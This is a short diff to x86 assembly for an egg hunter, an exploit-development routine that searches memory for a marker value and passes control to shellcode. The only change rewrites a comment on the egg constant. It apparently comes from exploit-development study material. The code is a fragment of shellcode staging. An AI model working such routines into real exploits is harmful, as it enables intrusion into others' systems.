@@ -19,7 +19,7 @@ search_shell:
 
 	cmp al,0xf2         ; If al is 242 (0xf2), then there is a sigaction error and egg hunter can not be executed
 	jz alignment        ; The code keeps jumping to alignment until the comparison is set to False (searchs the egghunter)
-	mov eax, 0x7A6EA1A2 ; Here is the pointer where the egg is saved until the jump is reached
+	mov eax, 0x7A6EA1A2 ; Here is the eggcode
 	mov edi, ecx        ; Moves ecx to edi (pointer to the shellcode)
 	scasd   	    ; Compares (double word) eax with edi 
 	jnz search_shell    ; If it did not match try the next address
